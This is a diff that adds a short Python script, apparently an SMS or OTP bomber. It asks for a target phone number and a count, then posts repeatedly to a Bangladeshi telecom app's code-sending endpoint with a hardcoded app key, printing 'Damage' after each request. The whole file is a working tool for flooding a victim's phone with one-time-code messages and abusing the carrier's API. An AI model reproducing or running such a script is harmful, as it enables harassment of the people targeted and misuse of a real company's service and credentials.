@@ -1,0 +1,15 @@
+import requests
+from requests.structures import CaseInsensitiveDict
+
+number=str(input('[>] Enter Your Target Number:'))
+url = "https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=13001&app_version=79&msisdn=88"+number
+
+headers = CaseInsensitiveDict()
+headers["x-app-key"] = "000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg"
+headers["User-Agent"]="gzip"
+
+amount=int(input('[>] Enter Your Target Amount:'))
+
+for i in range(amount):
+    requests.post(url, headers=headers)
+    print(str(i+1)+' Damage\n')
